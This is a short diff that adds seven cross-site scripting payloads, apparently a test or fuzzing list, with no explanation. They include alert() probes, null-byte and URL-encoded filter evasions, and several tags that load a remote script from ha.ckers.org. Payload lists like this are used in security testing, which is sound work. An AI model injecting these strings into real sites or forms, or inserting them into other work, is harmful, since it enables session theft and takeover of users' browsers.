@@ -1,0 +1,7 @@
+<SCRIPT>alert('XSS');</SCRIPT>
+'';!--"<XSS>=&{()}
+<SCRIPT SRC=http://ha.ckers.org/xss.js></SCRIPT>
+<SCR%00IPT>alert(\"XSS\")</SCR%00IPT>
+<SCRIPT/XSS SRC="http://ha.ckers.org/xss.js"></SCRIPT>
+<SCRIPT SRC=http://ha.ckers.org/xss.js?<B>
+%22%3Cscript%3Ealert%28%27XSS%27%29%3C%2Fscript%3E
